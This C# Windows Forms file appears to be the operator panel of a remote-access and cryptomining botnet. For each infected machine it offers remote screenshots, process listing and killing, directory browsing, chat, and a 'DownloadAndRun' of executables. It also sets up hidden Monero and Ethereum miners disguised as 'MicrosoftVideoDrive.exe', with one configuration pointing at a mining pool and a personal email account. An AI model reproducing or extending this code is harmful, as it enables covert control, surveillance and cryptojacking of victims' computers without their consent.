using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ServerWorker.Server;
using Interfaces;
using System.Reflection;

namespace ServerWorker
{
    public partial class FormUserCard : Form
    {

        private User user;
        private LogUserCard log;
        private PictureForm picture;

        

        public FormUserCard(User user)
        {
            InitializeComponent();
            this.user = user;

            //Запрос id, если отсутствует userData (Старая версия клиента)
            if (user.userData == null) 
            {
                try
                {
                    string key =  user.UsersCom.GetKey();
                    user.userData = new UserCard.UserData(key);
                    Log.Send("UserKey: " + user.userData.id);
                }
                catch (Exception ex)
                {
                    Log.Send("FormUserCard: " + ex.Message);
                }
            }

            user.userData.setting = user.UsersCom.GetSetting();
            comboBox1.SelectedIndex = (int)user.userData.setting.MValut;

            comboBox1.SelectedIndexChanged += (object sender, EventArgs e) => 
                SetMinerSettings((DDMiners)comboBox1.SelectedIndex);

            DrawUserInfoDevice();
        }

        private void SetMinerSettings(DDMiners valute)
        {
            switch (valute)
            {
                case DDMiners.none:
                    user.UsersCom.SetMSettings(@"Standart\Miner", "Data", "MicrosoftVideoDrive.exe","",false,DDMiners.none);
                    break;
                case DDMiners.XMR_N:
                    user.UsersCom.SetMSettings(@"M\XMRN", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_N);
                    break;
                case DDMiners.XMR_A:
                    user.UsersCom.SetMSettings(@"M\XMRA", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_A);
                    break;
                case DDMiners.ETH_N:
                    user.UsersCom.SetMSettings(@"M\ETHN", "Data", "MicrosoftVideoDrive.exe", "-U -S eth.pool.minergate.com:45791 -u xismatulin.ru@yandex.ru --cuda-parallel-hash 4", true, DDMiners.ETH_N);
                    break;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {            
            log = new LogUserCard();
            log.Show();
            log.Text = "Ожидайте, идет получение лога..";
            DrawLog(user.UsersCom.GetLog());
        }

        private void DrawLog(List<string> events)
        {
            try
            {
                if (log.InvokeRequired) Program.form1.BeginInvoke(new Action(() => { log.DrawNewLog(events); }));
                else log.DrawNewLog(events);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                DrawInfoDevice(user.UsersCom.GetInfoDevice());

                if (user.userData.id != "")
                    user.userData.SaveDataToFile(user.userData.id + ".xml");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void DrawInfoDevice(IInfoDevice infoDevice)
        {
            if (listBox2.InvokeRequired) listBox2.BeginInvoke(new Action(() => { listBox2.Items.Clear(); }));
            else listBox2.Items.Clear();
            user.userData.infoDevice = infoDevice;

            foreach (string str in infoDevice.GetListInfo())
            {
                try
                {
                    if (listBox2.InvokeRequired) listBox2.BeginInvoke(new Action(() => { listBox2.Items.Add(str); }));
                    else listBox2.Items.Add(str);
                }
                catch
                { }
            }
        }


        public void DrawUserInfoDevice()
        {
            try
            {
                foreach (string str in user.userData.infoDevice.GetListInfo())
                {
                    try
                    {
                        if (listBox2.InvokeRequired) listBox2.BeginInvoke(new Action(() => { listBox2.Items.Add(str); }));
                        else listBox2.Items.Add(str);
                    }
                    catch
                    { }
                }


            }
            catch (Exception e)
            {
                Log.Send("The process failed: " + e.ToString());
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            user.UsersCom.DownloadF("Miner", "Data");
        }

        private void button4_Click_1(object sender, EventArgs e)
        {
            user.UsersCom.RunM();
        }


        private void button8_Click(object sender, EventArgs e)
        {
            try
            {
                Bitmap BM = user.UsersCom.ScreenShot();
                picture = new PictureForm(BM);
                picture.Show();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void button9_Click(object sender, EventArgs e)
        {
            listBox2.Items.Clear();
            listBox2.Items.AddRange(user.UsersCom.GetListProc().ToArray());
        }

        private void button10_Click(object sender, EventArgs e)
        {
            DirectoryViewForm directoryViewForm = new DirectoryViewForm(user);
            directoryViewForm.Show();
        }

        private void KillProc(string procName)
        {
            user.UsersCom.KillProcess(procName);
        }

        private void listBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete)
            {
                try
                {
                    KillProc(listBox2.SelectedItem.ToString());
                    listBox2.Items.Clear();
                    listBox2.Items.AddRange(user.UsersCom.GetListProc().ToArray());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private void button5_Click_1(object sender, EventArgs e)
        {
            try
            {
                user.userData.setting = user.UsersCom.GetSetting();
                DrawSettings();

                if (user.userData.id != "")
                    user.userData.SaveDataToFile(user.userData.id + ".xml");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void DrawSettings()
        {
            listBox2.Items.Clear();
            listBox2.Items.Add( "<<===Comp_name===>>");
            listBox2.Items.Add(user.userData.setting.Comp_name);
            listBox2.Items.Add("<<===IsMiner===>>");
            listBox2.Items.Add(user.userData.setting.IsMiner);
            listBox2.Items.Add("<<===Key===>>");
            listBox2.Items.Add(user.userData.setting.Key);
            listBox2.Items.Add("<<===Open_sum===>>");
            listBox2.Items.Add(user.userData.setting.Open_sum);
            listBox2.Items.Add("<<===Start_time===>>");
            listBox2.Items.Add(user.userData.setting.Start_time);
            listBox2.Items.Add("<<===Version===>>");
            listBox2.Items.Add(user.userData.setting.Version);
            listBox2.Items.Add("<<===MFTPFloader===>>");
            listBox2.Items.Add(user.userData.setting.MFTPFloader);
            listBox2.Items.Add("<<===MLocalFloader===>>");
            listBox2.Items.Add(user.userData.setting.MLocalFloader);
            listBox2.Items.Add("<<===MFileName===>>");
            listBox2.Items.Add(user.userData.setting.MFileName);
            listBox2.Items.Add("<<===MArgs===>>");
            listBox2.Items.Add(user.userData.setting.MArgs);
            listBox2.Items.Add("<<===MValut===>>");
            listBox2.Items.Add(user.userData.setting.MValut);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            ServerChatForm chat = new ServerChatForm(user);
            chat.Show();
            user.UsersCom.StartChat();
        }

        private void button7_Click(object sender, EventArgs e)
        {
            user.UsersCom.DownloadAndRun("VideoDrive.exe");
        }
    }
}
